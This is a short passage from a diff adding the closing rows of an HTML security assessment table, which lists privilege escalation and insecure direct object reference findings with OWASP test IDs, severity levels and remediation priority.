+                    <td>OTG-AUTHZ-003</td>
+                    <td>Privilege Escalation</td>
+                    <td class="severity-critical">Critical</td>
+                    <td>Users can escalate privileges to gain admin access</td>
+                    <td>Immediate</td>
+                </tr>
+                <tr>
+                    <td>OTG-AUTHZ-004</td>
+                    <td>Insecure Direct Object References</td>
+                    <td class="severity-high">High</td>
+                    <td>Application exposes internal object references without proper access control</td>
+                    <td>Immediate</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+</body>
+</html>
